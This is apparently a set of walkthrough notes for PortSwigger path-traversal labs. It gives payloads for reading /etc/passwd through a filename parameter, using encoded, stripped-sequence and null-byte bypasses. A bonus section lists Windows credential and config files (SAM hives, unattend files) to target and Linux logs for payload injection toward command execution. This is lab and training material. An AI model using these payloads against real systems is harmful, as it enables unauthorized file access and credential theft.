<!-- omit in toc -->
# Dreictory traversal

<!-- omit in toc -->
## Table of Contents

- [File path traversal, simple case](#file-path-traversal-simple-case)
- [File path traversal, traversal sequences blocked with absolute path bypass](#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass)
- [File path traversal, traversal sequences stripped non-recursively](#file-path-traversal-traversal-sequences-stripped-non-recursively)
- [File path traversal, traversal sequences stripped with superfluous URL-decode](#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
- [File path traversal, validation of start of path](#file-path-traversal-validation-of-start-of-path)
- [File path traversal, validation of file extension with null byte bypass](#file-path-traversal-validation-of-file-extension-with-null-byte-bypass)

## File path traversal, simple case
Reference: https://portswigger.net/web-security/file-path-traversal/lab-simple

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
```
../../../etc/passwd
```
3. Observe that the response contains the contents of the ``/etc/passwd`` file.

## File path traversal, traversal sequences blocked with absolute path bypass
Reference: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value ``/etc/passwd``.
3. Observe that the response contains the contents of the ``/etc/passwd`` file.

## File path traversal, traversal sequences stripped non-recursively
Reference: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
```
....//....//....//etc/passwd
```
3. Observe that the response contains the contents of the ``/etc/passwd`` file.

## File path traversal, traversal sequences stripped with superfluous URL-decode
Reference: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
```
..%252f..%252f..%252fetc/passwd
```
3. Observe that the response contains the contents of the ``/etc/passwd`` file.

## File path traversal, validation of start of path
Reference: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

tag:
Missing parameter 'filename'

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
```
/var/www/images/../../../etc/passwd
```
3. Observe that the response contains the contents of the ``/etc/passwd`` file.

## File path traversal, validation of file extension with null byte bypass
Reference

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
```
../../../etc/passwd%00.png
```
3. Observe that the response contains the contents of the ``/etc/passwd`` file.

additional bypass:

GET /%2e%2e%2e%2F%2e%5C%2Fetc/passwd


----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
BONUS: Tests for Windows

Interesting Windows files

Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside...

c:\windows\system32\license.rtf
c:\windows\system32\eula.txt

Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)

c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system

The following log files are controllable and can be included with an evil payload to achieve a command execution

/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail